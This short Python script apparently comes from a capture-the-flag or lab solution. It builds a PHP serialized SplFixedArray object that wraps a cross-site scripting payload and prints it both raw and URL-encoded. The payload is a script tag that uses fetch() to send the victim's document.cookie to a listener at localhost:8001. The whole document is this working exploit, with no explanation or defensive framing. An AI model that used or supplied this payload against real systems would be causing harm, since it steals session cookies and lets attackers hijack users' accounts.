from urllib.parse import quote_plus

xssPayload = '<script>fetch(`http://localhost:8001/?${document.cookie}`)</script>'

serializedObjectString = f'O:13:"SplFixedArray":1:{{s:{len(xssPayload)}:"{xssPayload}";N;}}'
print(f'Serialized object string: {serializedObjectString}')
print(f'Serialized object string (URL encoded): {quote_plus(serializedObjectString)}')


 